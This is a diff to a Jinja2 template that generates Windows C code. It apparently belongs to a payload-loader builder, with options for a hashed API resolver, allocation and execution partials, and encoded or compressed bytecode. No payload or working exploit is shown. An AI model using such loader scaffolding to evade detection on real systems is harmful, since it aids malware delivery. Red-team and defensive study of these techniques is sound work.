@@ -1,13 +1,12 @@
 #include <windows.h>
-{% if debug_mode %}
-#include <stdio.h>
-#include <debugapi.h>
-{% endif %}
-{% if bytecode_transformation or bytecode_compression %}
 #include <stdint.h>
 #include <stdbool.h>
 #include <compressapi.h>
 #include <ntstatus.h>
+#include <winternl.h>
+{% if debug_mode %}
+#include <stdio.h>
+#include <debugapi.h>
 {% endif %}
 
 // We're using DEBUG_PRINT macro if debug mode is selected
@@ -23,8 +22,12 @@ char debug_buffer[512];
 {% endif %}
 
 // --- DYNAMICALLY INCLUDE PARTIALS ---
+{% if api_resolver == 'hashed' %}
+    {% include 'partials/api_resolver_hashed.c.j2' %}
+{% else %}
+    {% include 'partials/api_resolver.c.j2' %}
+{% endif %}
 {% include data_source_partial %}
-{% include 'partials/api_resolver.c.j2' %}
 {% include allocation_partial %}
 {% include execution_partial %}
 {% if bytecode_transformation == 'base64_encoder' %}
